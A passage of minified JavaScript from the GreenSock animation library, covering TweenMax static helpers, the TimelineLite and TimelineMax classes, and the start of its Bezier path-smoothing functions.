            var f, c, m, d, g = n.delay || 0, v = [], y = function() {
                n.onComplete && n.onComplete.apply(n.onCompleteScope || this, arguments),
                _.apply(p || this, u || l)
            };
            for (o(t) || ("string" == typeof t && (t = i.selector(t) || t),
            a(t) && (t = s.call(t, 0))),
            f = t.length,
            m = 0; f > m; m++) {
                c = {};
                for (d in n)
                    c[d] = n[d];
                c.delay = g,
                m === f - 1 && _ && (c.onComplete = y),
                v[m] = new r(t[m],e,c),
                g += h
            }
            return v
        }
        ,
        r.staggerFrom = r.allFrom = function(t, e, i, s, n, a, o) {
            return i.runBackwards = !0,
            i.immediateRender = 0 != i.immediateRender,
            r.staggerTo(t, e, i, s, n, a, o)
        }
        ,
        r.staggerFromTo = r.allFromTo = function(t, e, i, s, n, a, o, h) {
            return s.startAt = i,
            s.immediateRender = 0 != s.immediateRender && 0 != i.immediateRender,
            r.staggerTo(t, e, s, n, a, o, h)
        }
        ,
        r.delayedCall = function(t, e, i, s, n) {
            return new r(e,0,{
                delay: t,
                onComplete: e,
                onCompleteParams: i,
                onCompleteScope: s,
                onReverseComplete: e,
                onReverseCompleteParams: i,
                onReverseCompleteScope: s,
                immediateRender: !1,
                useFrames: n,
                overwrite: 0
            })
        }
        ,
        r.set = function(t, e) {
            return new r(t,0,e)
        }
        ,
        r.isTweening = function(t) {
            return i.getTweensOf(t, !0).length > 0
        }
        ;
        var _ = function(t, e) {
            for (var s = [], r = 0, n = t._first; n; )
                n instanceof i ? s[r++] = n : (e && (s[r++] = n),
                s = s.concat(_(n, e)),
                r = s.length),
                n = n._next;
            return s
        }
          , u = r.getAllTweens = function(e) {
            return _(t._rootTimeline, e).concat(_(t._rootFramesTimeline, e))
        }
        ;
        r.killAll = function(t, i, s, r) {
            null == i && (i = !0),
            null == s && (s = !0);
            var n, a, o, h = u(0 != r), l = h.length, _ = i && s && r;
            for (o = 0; l > o; o++)
                a = h[o],
                (_ || a instanceof e || (n = a.target === a.vars.onComplete) && s || i && !n) && (t ? a.totalTime(a.totalDuration()) : a._enabled(!1, !1))
        }
        ,
        r.killChildTweensOf = function(t, e) {
            if (null != t) {
                var n, h, l, _, u, p = i._tweenLookup;
                if ("string" == typeof t && (t = i.selector(t) || t),
                a(t) && (t = s(t, 0)),
                o(t))
                    for (_ = t.length; --_ > -1; )
                        r.killChildTweensOf(t[_], e);
                else {
                    n = [];
                    for (l in p)
                        for (h = p[l].target.parentNode; h; )
                            h === t && (n = n.concat(p[l].tweens)),
                            h = h.parentNode;
                    for (u = n.length,
                    _ = 0; u > _; _++)
                        e && n[_].totalTime(n[_].totalDuration()),
                        n[_]._enabled(!1, !1)
                }
            }
        }
        ;
        var p = function(t, i, s, r) {
            i = i !== !1,
            s = s !== !1,
            r = r !== !1;
            for (var n, a, o = u(r), h = i && s && r, l = o.length; --l > -1; )
                a = o[l],
                (h || a instanceof e || (n = a.target === a.vars.onComplete) && s || i && !n) && a.paused(t)
        };
        return r.pauseAll = function(t, e, i) {
            p(!0, t, e, i)
        }
        ,
        r.resumeAll = function(t, e, i) {
            p(!1, t, e, i)
        }
        ,
        r.globalTimeScale = function(e) {
            var s = t._rootTimeline
              , r = i.ticker.time;
            return arguments.length ? (e = e || n,
            s._startTime = r - (r - s._startTime) * s._timeScale / e,
            s = t._rootFramesTimeline,
            r = i.ticker.frame,
            s._startTime = r - (r - s._startTime) * s._timeScale / e,
            s._timeScale = t._rootTimeline._timeScale = e,
            e) : s._timeScale
        }
        ,
        h.progress = function(t) {
            return arguments.length ? this.totalTime(this.duration() * (this._yoyo && 0 !== (1 & this._cycle) ? 1 - t : t) + this._cycle * (this._duration + this._repeatDelay), !1) : this._time / this.duration()
        }
        ,
        h.totalProgress = function(t) {
            return arguments.length ? this.totalTime(this.totalDuration() * t, !1) : this._totalTime / this.totalDuration()
        }
        ,
        h.time = function(t, e) {
            return arguments.length ? (this._dirty && this.totalDuration(),
            t > this._duration && (t = this._duration),
            this._yoyo && 0 !== (1 & this._cycle) ? t = this._duration - t + this._cycle * (this._duration + this._repeatDelay) : 0 !== this._repeat && (t += this._cycle * (this._duration + this._repeatDelay)),
            this.totalTime(t, e)) : this._time
        }
        ,
        h.duration = function(e) {
            return arguments.length ? t.prototype.duration.call(this, e) : this._duration
        }
        ,
        h.totalDuration = function(t) {
            return arguments.length ? -1 === this._repeat ? this : this.duration((t - this._repeat * this._repeatDelay) / (this._repeat + 1)) : (this._dirty && (this._totalDuration = -1 === this._repeat ? 999999999999 : this._duration * (this._repeat + 1) + this._repeatDelay * this._repeat,
            this._dirty = !1),
            this._totalDuration)
        }
        ,
        h.repeat = function(t) {
            return arguments.length ? (this._repeat = t,
            this._uncache(!0)) : this._repeat
        }
        ,
        h.repeatDelay = function(t) {
            return arguments.length ? (this._repeatDelay = t,
            this._uncache(!0)) : this._repeatDelay
        }
        ,
        h.yoyo = function(t) {
            return arguments.length ? (this._yoyo = t,
            this) : this._yoyo
        }
        ,
        r
    }, !0),
    window._gsDefine("TimelineLite", ["core.Animation", "core.SimpleTimeline", "TweenLite"], function(t, e, i) {
        var s = function(t) {
            e.call(this, t),
            this._labels = {},
            this.autoRemoveChildren = this.vars.autoRemoveChildren === !0,
            this.smoothChildTiming = this.vars.smoothChildTiming === !0,
            this._sortChildren = !0,
            this._onUpdate = this.vars.onUpdate;
            var i, s, r = this.vars;
            for (s in r)
                i = r[s],
                a(i) && -1 !== i.join("").indexOf("{self}") && (r[s] = this._swapSelfInParams(i));
            a(r.tweens) && this.add(r.tweens, 0, r.align, r.stagger)
        }
          , r = 1e-10
          , n = i._internals.isSelector
          , a = i._internals.isArray
          , o = []
          , h = function(t) {
            var e, i = {};
            for (e in t)
                i[e] = t[e];
            return i
        }
          , l = function(t, e, i, s) {
            t._timeline.pause(t._startTime),
            e && e.apply(s || t._timeline, i || o)
        }
          , _ = o.slice
          , u = s.prototype = new e;
        return s.version = "1.11.0",
        u.constructor = s,
        u.kill()._gc = !1,
        u.to = function(t, e, s, r) {
            return e ? this.add(new i(t,e,s), r) : this.set(t, s, r)
        }
        ,
        u.from = function(t, e, s, r) {
            return this.add(i.from(t, e, s), r)
        }
        ,
        u.fromTo = function(t, e, s, r, n) {
            return e ? this.add(i.fromTo(t, e, s, r), n) : this.set(t, r, n)
        }
        ,
        u.staggerTo = function(t, e, r, a, o, l, u, p) {
            var f, c = new s({
                onComplete: l,
                onCompleteParams: u,
                onCompleteScope: p
            });
            for ("string" == typeof t && (t = i.selector(t) || t),
            n(t) && (t = _.call(t, 0)),
            a = a || 0,
            f = 0; t.length > f; f++)
                r.startAt && (r.startAt = h(r.startAt)),
                c.to(t[f], e, h(r), f * a);
            return this.add(c, o)
        }
        ,
        u.staggerFrom = function(t, e, i, s, r, n, a, o) {
            return i.immediateRender = 0 != i.immediateRender,
            i.runBackwards = !0,
            this.staggerTo(t, e, i, s, r, n, a, o)
        }
        ,
        u.staggerFromTo = function(t, e, i, s, r, n, a, o, h) {
            return s.startAt = i,
            s.immediateRender = 0 != s.immediateRender && 0 != i.immediateRender,
            this.staggerTo(t, e, s, r, n, a, o, h)
        }
        ,
        u.call = function(t, e, s, r) {
            return this.add(i.delayedCall(0, t, e, s), r)
        }
        ,
        u.set = function(t, e, s) {
            return s = this._parseTimeOrLabel(s, 0, !0),
            null == e.immediateRender && (e.immediateRender = s === this._time && !this._paused),
            this.add(new i(t,0,e), s)
        }
        ,
        s.exportRoot = function(t, e) {
            t = t || {},
            null == t.smoothChildTiming && (t.smoothChildTiming = !0);
            var r, n, a = new s(t), o = a._timeline;
            for (null == e && (e = !0),
            o._remove(a, !0),
            a._startTime = 0,
            a._rawPrevTime = a._time = a._totalTime = o._time,
            r = o._first; r; )
                n = r._next,
                e && r instanceof i && r.target === r.vars.onComplete || a.add(r, r._startTime - r._delay),
                r = n;
            return o.add(a, 0),
            a
        }
        ,
        u.add = function(r, n, o, h) {
            var l, _, u, p, f, c;
            if ("number" != typeof n && (n = this._parseTimeOrLabel(n, 0, !0, r)),
            !(r instanceof t)) {
                if (r instanceof Array || r && r.push && a(r)) {
                    for (o = o || "normal",
                    h = h || 0,
                    l = n,
                    _ = r.length,
                    u = 0; _ > u; u++)
                        a(p = r[u]) && (p = new s({
                            tweens: p
                        })),
                        this.add(p, l),
                        "string" != typeof p && "function" != typeof p && ("sequence" === o ? l = p._startTime + p.totalDuration() / p._timeScale : "start" === o && (p._startTime -= p.delay())),
                        l += h;
                    return this._uncache(!0)
                }
                if ("string" == typeof r)
                    return this.addLabel(r, n);
                if ("function" != typeof r)
                    throw "Cannot add " + r + " into the timeline; it is not a tween, timeline, function, or string.";
                r = i.delayedCall(0, r)
            }
            if (e.prototype.add.call(this, r, n),
            this._gc && !this._paused && this._duration < this.duration())
                for (f = this,
                c = f.rawTime() > r._startTime; f._gc && f._timeline; )
                    f._timeline.smoothChildTiming && c ? f.totalTime(f._totalTime, !0) : f._enabled(!0, !1),
                    f = f._timeline;
            return this
        }
        ,
        u.remove = function(e) {
            if (e instanceof t)
                return this._remove(e, !1);
            if (e instanceof Array || e && e.push && a(e)) {
                for (var i = e.length; --i > -1; )
                    this.remove(e[i]);
                return this
            }
            return "string" == typeof e ? this.removeLabel(e) : this.kill(null, e)
        }
        ,
        u._remove = function(t, i) {
            e.prototype._remove.call(this, t, i);
            var s = this._last;
            return s ? this._time > s._startTime + s._totalDuration / s._timeScale && (this._time = this.duration(),
            this._totalTime = this._totalDuration) : this._time = this._totalTime = 0,
            this
        }
        ,
        u.append = function(t, e) {
            return this.add(t, this._parseTimeOrLabel(null, e, !0, t))
        }
        ,
        u.insert = u.insertMultiple = function(t, e, i, s) {
            return this.add(t, e || 0, i, s)
        }
        ,
        u.appendMultiple = function(t, e, i, s) {
            return this.add(t, this._parseTimeOrLabel(null, e, !0, t), i, s)
        }
        ,
        u.addLabel = function(t, e) {
            return this._labels[t] = this._parseTimeOrLabel(e),
            this
        }
        ,
        u.addPause = function(t, e, i, s) {
            return this.call(l, ["{self}", e, i, s], this, t)
        }
        ,
        u.removeLabel = function(t) {
            return delete this._labels[t],
            this
        }
        ,
        u.getLabelTime = function(t) {
            return null != this._labels[t] ? this._labels[t] : -1
        }
        ,
        u._parseTimeOrLabel = function(e, i, s, r) {
            var n;
            if (r instanceof t && r.timeline === this)
                this.remove(r);
            else if (r && (r instanceof Array || r.push && a(r)))
                for (n = r.length; --n > -1; )
                    r[n]instanceof t && r[n].timeline === this && this.remove(r[n]);
            if ("string" == typeof i)
                return this._parseTimeOrLabel(i, s && "number" == typeof e && null == this._labels[i] ? e - this.duration() : 0, s);
            if (i = i || 0,
            "string" != typeof e || !isNaN(e) && null == this._labels[e])
                null == e && (e = this.duration());
            else {
                if (n = e.indexOf("="),
                -1 === n)
                    return null == this._labels[e] ? s ? this._labels[e] = this.duration() + i : i : this._labels[e] + i;
                i = parseInt(e.charAt(n - 1) + "1", 10) * Number(e.substr(n + 1)),
                e = n > 1 ? this._parseTimeOrLabel(e.substr(0, n - 1), 0, s) : this.duration()
            }
            return Number(e) + i
        }
        ,
        u.seek = function(t, e) {
            return this.totalTime("number" == typeof t ? t : this._parseTimeOrLabel(t), e !== !1)
        }
        ,
        u.stop = function() {
            return this.paused(!0)
        }
        ,
        u.gotoAndPlay = function(t, e) {
            return this.play(t, e)
        }
        ,
        u.gotoAndStop = function(t, e) {
            return this.pause(t, e)
        }
        ,
        u.render = function(t, e, i) {
            this._gc && this._enabled(!0, !1);
            var s, n, a, h, l, _ = this._dirty ? this.totalDuration() : this._totalDuration, u = this._time, p = this._startTime, f = this._timeScale, c = this._paused;
            if (t >= _ ? (this._totalTime = this._time = _,
            this._reversed || this._hasPausedChild() || (n = !0,
            h = "onComplete",
            0 === this._duration && (0 === t || 0 > this._rawPrevTime || this._rawPrevTime === r) && this._rawPrevTime !== t && this._first && (l = !0,
            this._rawPrevTime > r && (h = "onReverseComplete"))),
            this._rawPrevTime = this._duration || !e || t ? t : r,
            t = _ + 1e-6) : 1e-7 > t ? (this._totalTime = this._time = 0,
            (0 !== u || 0 === this._duration && (this._rawPrevTime > r || 0 > t && this._rawPrevTime >= 0)) && (h = "onReverseComplete",
            n = this._reversed),
            0 > t ? (this._active = !1,
            0 === this._duration && this._rawPrevTime >= 0 && this._first && (l = !0),
            this._rawPrevTime = t) : (this._rawPrevTime = this._duration || !e || t ? t : r,
            t = 0,
            this._initted || (l = !0))) : this._totalTime = this._time = this._rawPrevTime = t,
            this._time !== u && this._first || i || l) {
                if (this._initted || (this._initted = !0),
                this._active || !this._paused && this._time !== u && t > 0 && (this._active = !0),
                0 === u && this.vars.onStart && 0 !== this._time && (e || this.vars.onStart.apply(this.vars.onStartScope || this, this.vars.onStartParams || o)),
                this._time >= u)
                    for (s = this._first; s && (a = s._next,
                    !this._paused || c); )
                        (s._active || s._startTime <= this._time && !s._paused && !s._gc) && (s._reversed ? s.render((s._dirty ? s.totalDuration() : s._totalDuration) - (t - s._startTime) * s._timeScale, e, i) : s.render((t - s._startTime) * s._timeScale, e, i)),
                        s = a;
                else
                    for (s = this._last; s && (a = s._prev,
                    !this._paused || c); )
                        (s._active || u >= s._startTime && !s._paused && !s._gc) && (s._reversed ? s.render((s._dirty ? s.totalDuration() : s._totalDuration) - (t - s._startTime) * s._timeScale, e, i) : s.render((t - s._startTime) * s._timeScale, e, i)),
                        s = a;
                this._onUpdate && (e || this._onUpdate.apply(this.vars.onUpdateScope || this, this.vars.onUpdateParams || o)),
                h && (this._gc || (p === this._startTime || f !== this._timeScale) && (0 === this._time || _ >= this.totalDuration()) && (n && (this._timeline.autoRemoveChildren && this._enabled(!1, !1),
                this._active = !1),
                !e && this.vars[h] && this.vars[h].apply(this.vars[h + "Scope"] || this, this.vars[h + "Params"] || o)))
            }
        }
        ,
        u._hasPausedChild = function() {
            for (var t = this._first; t; ) {
                if (t._paused || t instanceof s && t._hasPausedChild())
                    return !0;
                t = t._next
            }
            return !1
        }
        ,
        u.getChildren = function(t, e, s, r) {
            r = r || -9999999999;
            for (var n = [], a = this._first, o = 0; a; )
                r > a._startTime || (a instanceof i ? e !== !1 && (n[o++] = a) : (s !== !1 && (n[o++] = a),
                t !== !1 && (n = n.concat(a.getChildren(!0, e, s)),
                o = n.length))),
                a = a._next;
            return n
        }
        ,
        u.getTweensOf = function(t, e) {
            for (var s = i.getTweensOf(t), r = s.length, n = [], a = 0; --r > -1; )
                (s[r].timeline === this || e && this._contains(s[r])) && (n[a++] = s[r]);
            return n
        }
        ,
        u._contains = function(t) {
            for (var e = t.timeline; e; ) {
                if (e === this)
                    return !0;
                e = e.timeline
            }
            return !1
        }
        ,
        u.shiftChildren = function(t, e, i) {
            i = i || 0;
            for (var s, r = this._first, n = this._labels; r; )
                r._startTime >= i && (r._startTime += t),
                r = r._next;
            if (e)
                for (s in n)
                    n[s] >= i && (n[s] += t);
            return this._uncache(!0)
        }
        ,
        u._kill = function(t, e) {
            if (!t && !e)
                return this._enabled(!1, !1);
            for (var i = e ? this.getTweensOf(e) : this.getChildren(!0, !0, !1), s = i.length, r = !1; --s > -1; )
                i[s]._kill(t, e) && (r = !0);
            return r
        }
        ,
        u.clear = function(t) {
            var e = this.getChildren(!1, !0, !0)
              , i = e.length;
            for (this._time = this._totalTime = 0; --i > -1; )
                e[i]._enabled(!1, !1);
            return t !== !1 && (this._labels = {}),
            this._uncache(!0)
        }
        ,
        u.invalidate = function() {
            for (var t = this._first; t; )
                t.invalidate(),
                t = t._next;
            return this
        }
        ,
        u._enabled = function(t, i) {
            if (t === this._gc)
                for (var s = this._first; s; )
                    s._enabled(t, !0),
                    s = s._next;
            return e.prototype._enabled.call(this, t, i)
        }
        ,
        u.duration = function(t) {
            return arguments.length ? (0 !== this.duration() && 0 !== t && this.timeScale(this._duration / t),
            this) : (this._dirty && this.totalDuration(),
            this._duration)
        }
        ,
        u.totalDuration = function(t) {
            if (!arguments.length) {
                if (this._dirty) {
                    for (var e, i, s = 0, r = this._last, n = 999999999999; r; )
                        e = r._prev,
                        r._dirty && r.totalDuration(),
                        r._startTime > n && this._sortChildren && !r._paused ? this.add(r, r._startTime - r._delay) : n = r._startTime,
                        0 > r._startTime && !r._paused && (s -= r._startTime,
                        this._timeline.smoothChildTiming && (this._startTime += r._startTime / this._timeScale),
                        this.shiftChildren(-r._startTime, !1, -9999999999),
                        n = 0),
                        i = r._startTime + r._totalDuration / r._timeScale,
                        i > s && (s = i),
                        r = e;
                    this._duration = this._totalDuration = s,
                    this._dirty = !1
                }
                return this._totalDuration
            }
            return 0 !== this.totalDuration() && 0 !== t && this.timeScale(this._totalDuration / t),
            this
        }
        ,
        u.usesFrames = function() {
            for (var e = this._timeline; e._timeline; )
                e = e._timeline;
            return e === t._rootFramesTimeline
        }
        ,
        u.rawTime = function() {
            return this._paused ? this._totalTime : (this._timeline.rawTime() - this._startTime) * this._timeScale
        }
        ,
        s
    }, !0),
    window._gsDefine("TimelineMax", ["TimelineLite", "TweenLite", "easing.Ease"], function(t, e, i) {
        var s = function(e) {
            t.call(this, e),
            this._repeat = this.vars.repeat || 0,
            this._repeatDelay = this.vars.repeatDelay || 0,
            this._cycle = 0,
            this._yoyo = this.vars.yoyo === !0,
            this._dirty = !0
        }
          , r = 1e-10
          , n = []
          , a = new i(null,null,1,0)
          , o = s.prototype = new t;
        return o.constructor = s,
        o.kill()._gc = !1,
        s.version = "1.11.0",
        o.invalidate = function() {
            return this._yoyo = this.vars.yoyo === !0,
            this._repeat = this.vars.repeat || 0,
            this._repeatDelay = this.vars.repeatDelay || 0,
            this._uncache(!0),
            t.prototype.invalidate.call(this)
        }
        ,
        o.addCallback = function(t, i, s, r) {
            return this.add(e.delayedCall(0, t, s, r), i)
        }
        ,
        o.removeCallback = function(t, e) {
            if (t)
                if (null == e)
                    this._kill(null, t);
                else
                    for (var i = this.getTweensOf(t, !1), s = i.length, r = this._parseTimeOrLabel(e); --s > -1; )
                        i[s]._startTime === r && i[s]._enabled(!1, !1);
            return this
        }
        ,
        o.tweenTo = function(t, i) {
            i = i || {};
            var s, r, o = {
                ease: a,
                overwrite: 2,
                useFrames: this.usesFrames(),
                immediateRender: !1
            };
            for (s in i)
                o[s] = i[s];
            return o.time = this._parseTimeOrLabel(t),
            r = new e(this,Math.abs(Number(o.time) - this._time) / this._timeScale || .001,o),
            o.onStart = function() {
                r.target.paused(!0),
                r.vars.time !== r.target.time() && r.duration(Math.abs(r.vars.time - r.target.time()) / r.target._timeScale),
                i.onStart && i.onStart.apply(i.onStartScope || r, i.onStartParams || n)
            }
            ,
            r
        }
        ,
        o.tweenFromTo = function(t, e, i) {
            i = i || {},
            t = this._parseTimeOrLabel(t),
            i.startAt = {
                onComplete: this.seek,
                onCompleteParams: [t],
                onCompleteScope: this
            },
            i.immediateRender = i.immediateRender !== !1;
            var s = this.tweenTo(e, i);
            return s.duration(Math.abs(s.vars.time - t) / this._timeScale || .001)
        }
        ,
        o.render = function(t, e, i) {
            this._gc && this._enabled(!0, !1);
            var s, a, o, h, l, _, u = this._dirty ? this.totalDuration() : this._totalDuration, p = this._duration, f = this._time, c = this._totalTime, m = this._startTime, d = this._timeScale, g = this._rawPrevTime, v = this._paused, y = this._cycle;
            if (t >= u ? (this._locked || (this._totalTime = u,
            this._cycle = this._repeat),
            this._reversed || this._hasPausedChild() || (a = !0,
            h = "onComplete",
            0 === this._duration && (0 === t || 0 > g || g === r) && g !== t && this._first && (l = !0,
            g > r && (h = "onReverseComplete"))),
            this._rawPrevTime = this._duration || !e || t ? t : r,
            this._yoyo && 0 !== (1 & this._cycle) ? this._time = t = 0 : (this._time = p,
            t = p + 1e-6)) : 1e-7 > t ? (this._locked || (this._totalTime = this._cycle = 0),
            this._time = 0,
            (0 !== f || 0 === p && (g > r || 0 > t && g >= 0) && !this._locked) && (h = "onReverseComplete",
            a = this._reversed),
            0 > t ? (this._active = !1,
            0 === p && g >= 0 && this._first && (l = !0),
            this._rawPrevTime = t) : (this._rawPrevTime = p || !e || t ? t : r,
            t = 0,
            this._initted || (l = !0))) : (0 === p && 0 > g && (l = !0),
            this._time = this._rawPrevTime = t,
            this._locked || (this._totalTime = t,
            0 !== this._repeat && (_ = p + this._repeatDelay,
            this._cycle = this._totalTime / _ >> 0,
            0 !== this._cycle && this._cycle === this._totalTime / _ && this._cycle--,
            this._time = this._totalTime - this._cycle * _,
            this._yoyo && 0 !== (1 & this._cycle) && (this._time = p - this._time),
            this._time > p ? (this._time = p,
            t = p + 1e-6) : 0 > this._time ? this._time = t = 0 : t = this._time))),
            this._cycle !== y && !this._locked) {
                var T = this._yoyo && 0 !== (1 & y)
                  , w = T === (this._yoyo && 0 !== (1 & this._cycle))
                  , x = this._totalTime
                  , b = this._cycle
                  , P = this._rawPrevTime
                  , S = this._time;
                if (this._totalTime = y * p,
                y > this._cycle ? T = !T : this._totalTime += p,
                this._time = f,
                this._rawPrevTime = 0 === p ? g - 1e-5 : g,
                this._cycle = y,
                this._locked = !0,
                f = T ? 0 : p,
                this.render(f, e, 0 === p),
                e || this._gc || this.vars.onRepeat && this.vars.onRepeat.apply(this.vars.onRepeatScope || this, this.vars.onRepeatParams || n),
                w && (f = T ? p + 1e-6 : -1e-6,
                this.render(f, !0, !1)),
                this._locked = !1,
                this._paused && !v)
                    return;
                this._time = S,
                this._totalTime = x,
                this._cycle = b,
                this._rawPrevTime = P
            }
            if (!(this._time !== f && this._first || i || l))
                return c !== this._totalTime && this._onUpdate && (e || this._onUpdate.apply(this.vars.onUpdateScope || this, this.vars.onUpdateParams || n)),
                void 0;
            if (this._initted || (this._initted = !0),
            this._active || !this._paused && this._totalTime !== c && t > 0 && (this._active = !0),
            0 === c && this.vars.onStart && 0 !== this._totalTime && (e || this.vars.onStart.apply(this.vars.onStartScope || this, this.vars.onStartParams || n)),
            this._time >= f)
                for (s = this._first; s && (o = s._next,
                !this._paused || v); )
                    (s._active || s._startTime <= this._time && !s._paused && !s._gc) && (s._reversed ? s.render((s._dirty ? s.totalDuration() : s._totalDuration) - (t - s._startTime) * s._timeScale, e, i) : s.render((t - s._startTime) * s._timeScale, e, i)),
                    s = o;
            else
                for (s = this._last; s && (o = s._prev,
                !this._paused || v); )
                    (s._active || f >= s._startTime && !s._paused && !s._gc) && (s._reversed ? s.render((s._dirty ? s.totalDuration() : s._totalDuration) - (t - s._startTime) * s._timeScale, e, i) : s.render((t - s._startTime) * s._timeScale, e, i)),
                    s = o;
            this._onUpdate && (e || this._onUpdate.apply(this.vars.onUpdateScope || this, this.vars.onUpdateParams || n)),
            h && (this._locked || this._gc || (m === this._startTime || d !== this._timeScale) && (0 === this._time || u >= this.totalDuration()) && (a && (this._timeline.autoRemoveChildren && this._enabled(!1, !1),
            this._active = !1),
            !e && this.vars[h] && this.vars[h].apply(this.vars[h + "Scope"] || this, this.vars[h + "Params"] || n)))
        }
        ,
        o.getActive = function(t, e, i) {
            null == t && (t = !0),
            null == e && (e = !0),
            null == i && (i = !1);
            var s, r, n = [], a = this.getChildren(t, e, i), o = 0, h = a.length;
            for (s = 0; h > s; s++)
                r = a[s],
                r.isActive() && (n[o++] = r);
            return n
        }
        ,
        o.getLabelAfter = function(t) {
            t || 0 !== t && (t = this._time);
            var e, i = this.getLabelsArray(), s = i.length;
            for (e = 0; s > e; e++)
                if (i[e].time > t)
                    return i[e].name;
            return null
        }
        ,
        o.getLabelBefore = function(t) {
            null == t && (t = this._time);
            for (var e = this.getLabelsArray(), i = e.length; --i > -1; )
                if (t > e[i].time)
                    return e[i].name;
            return null
        }
        ,
        o.getLabelsArray = function() {
            var t, e = [], i = 0;
            for (t in this._labels)
                e[i++] = {
                    time: this._labels[t],
                    name: t
                };
            return e.sort(function(t, e) {
                return t.time - e.time
            }),
            e
        }
        ,
        o.progress = function(t) {
            return arguments.length ? this.totalTime(this.duration() * (this._yoyo && 0 !== (1 & this._cycle) ? 1 - t : t) + this._cycle * (this._duration + this._repeatDelay), !1) : this._time / this.duration()
        }
        ,
        o.totalProgress = function(t) {
            return arguments.length ? this.totalTime(this.totalDuration() * t, !1) : this._totalTime / this.totalDuration()
        }
        ,
        o.totalDuration = function(e) {
            return arguments.length ? -1 === this._repeat ? this : this.duration((e - this._repeat * this._repeatDelay) / (this._repeat + 1)) : (this._dirty && (t.prototype.totalDuration.call(this),
            this._totalDuration = -1 === this._repeat ? 999999999999 : this._duration * (this._repeat + 1) + this._repeatDelay * this._repeat),
            this._totalDuration)
        }
        ,
        o.time = function(t, e) {
            return arguments.length ? (this._dirty && this.totalDuration(),
            t > this._duration && (t = this._duration),
            this._yoyo && 0 !== (1 & this._cycle) ? t = this._duration - t + this._cycle * (this._duration + this._repeatDelay) : 0 !== this._repeat && (t += this._cycle * (this._duration + this._repeatDelay)),
            this.totalTime(t, e)) : this._time
        }
        ,
        o.repeat = function(t) {
            return arguments.length ? (this._repeat = t,
            this._uncache(!0)) : this._repeat
        }
        ,
        o.repeatDelay = function(t) {
            return arguments.length ? (this._repeatDelay = t,
            this._uncache(!0)) : this._repeatDelay
        }
        ,
        o.yoyo = function(t) {
            return arguments.length ? (this._yoyo = t,
            this) : this._yoyo
        }
        ,
        o.currentLabel = function(t) {
            return arguments.length ? this.seek(t, !0) : this.getLabelBefore(this._time + 1e-8)
        }
        ,
        s
    }, !0),
    function() {
        var t = 180 / Math.PI
          , e = []
          , i = []
          , s = []
          , r = {}
          , n = function(t, e, i, s) {
            this.a = t,
            this.b = e,
            this.c = i,
            this.d = s,
            this.da = s - t,
            this.ca = i - t,
            this.ba = e - t
        }
          , a = ",x,y,z,left,top,right,bottom,marginTop,marginLeft,marginRight,marginBottom,paddingLeft,paddingTop,paddingRight,paddingBottom,backgroundPosition,backgroundPosition_y,"
          , o = function(t, e, i, s) {
            var r = {
                a: t
            }
              , n = {}
              , a = {}
              , o = {
                c: s
            }
              , h = (t + e) / 2
              , l = (e + i) / 2
              , _ = (i + s) / 2
              , u = (h + l) / 2
              , p = (l + _) / 2
              , f = (p - u) / 8;
            return r.b = h + (t - h) / 4,
            n.b = u + f,
            r.c = n.a = (r.b + n.b) / 2,
            n.c = a.a = (u + p) / 2,
            a.b = p - f,
            o.b = _ + (s - _) / 4,
            a.c = o.a = (a.b + o.b) / 2,
            [r, n, a, o]
        }
          , h = function(t, r, n, a, h) {
            var l, _, u, p, f, c, m, d, g, v, y, T, w, x = t.length - 1, b = 0, P = t[0].a;
            for (l = 0; x > l; l++)
                f = t[b],
                _ = f.a,
                u = f.d,
                p = t[b + 1].d,
                h ? (y = e[l],
                T = i[l],
                w = .25 * (T + y) * r / (a ? .5 : s[l] || .5),
                c = u - (u - _) * (a ? .5 * r : 0 !== y ? w / y : 0),
                m = u + (p - u) * (a ? .5 * r : 0 !== T ? w / T : 0),
                d = u - (c + ((m - c) * (3 * y / (y + T) + .5) / 4 || 0))) : (c = u - .5 * (u - _) * r,
                m = u + .5 * (p - u) * r,
                d = u - (c + m) / 2),
                c += d,
                m += d,
                f.c = g = c,
                f.b = 0 !== l ? P : P = f.a + .6 * (f.c - f.a),
                f.da = u - _,
                f.ca = g - _,
                f.ba = P - _,
                n ? (v = o(_, P, g, u),
                t.splice(b, 1, v[0], v[1], v[2], v[3]),
                b += 4) : b++,
                P = m;
            f = t[b],
            f.b = P,
            f.c = P + .4 * (f.d - P),
            f.da = f.d - f.a,
            f.ca = f.c - f.a,
            f.ba = P - f.a,
            n && (v = o(f.a, P, f.c, f.d),
            t.splice(b, 1, v[0], v[1], v[2], v[3]))
        }
          , l = function(t, s, r, a) {
            var o, h, l, _, u, p, f = [];
            if (a)
                for (t = [a].concat(t),
                h = t.length; --h > -1; )
                    "string" == typeof (p = t[h][s]) && "=" === p.charAt(1) && (t[h][s] = a[s] + Number(p.charAt(0) + p.substr(2)));
            if (o = t.length - 2,
            0 > o)
                return f[0] = new n(t[0][s],0,0,t[-1 > o ? 0 : 1][s]),
                f;
            for (h = 0; o > h; h++)
                l = t[h][s],
                _ = t[h + 1][s],
                f[h] = new n(l,0,0,_),
                r && (u = t[h + 2][s],
                e[h] = (e[h] || 0) + (_ - l) * (_ - l),
                i[h] = (i[h] || 0) + (u - _) * (u - _));
            return f[h] = new n(t[h][s],0,0,t[h + 1][s]),
            f
        }
          , _ = function(t, n, o, _, u, p) {
            var f, c, m, d, g, v, y, T, w = {}, x = [], b = p || t[0];
            u = "string" == typeof u ? "," + u + "," : a,
            null == n && (n = 1);
            for (c in t[0])
                x.push(c);
            if (t.length > 1) {
                for (T = t[t.length - 1],
                y = !0,
                f = x.length; --f > -1; )
                    if (c = x[f],
                    Math.abs(b[c] - T[c]) > .05) {
                        y = !1;
                        break
                    }
                y && (t = t.concat(),
                p && t.unshift(p),
                t.push(t[1]),
                p = t[t.length - 3])
            }
            for (e.length = i.length = s.length = 0,
            f = x.length; --f > -1; )
                c = x[f],
                r[c] = -1 !== u.indexOf("," + c + ","),
                w[c] = l(t, c, r[c], p);
            for (f = e.length; --f > -1; )
                e[f] = Math.sqrt(e[f]),
                i[f] = Math.sqrt(i[f]);
            if (!_) {
                for (f = x.length; --f > -1; )
                    if (r[c])
                        for (m = w[x[f]],
                        v = m.length - 1,
                        d = 0; v > d; d++)
                            g = m[d + 1].da / i[d] + m[d].da / e[d],
                            s[d] = (s[d] || 0) + g * g;
                for (f = s.length; --f > -1; )
                    s[f] = Math.sqrt(s[f])
            }
            for (f = x.length,
            d = o ? 4 : 1; --f > -1; )
                c = x[f],
                m = w[c],
                h(m, n, o, _, r[c]),
                y && (m.splice(0, d),
                m.splice(m.length - d, d));
            return w
        }
          , u = function(t, e, i) {
            e = e || "soft";
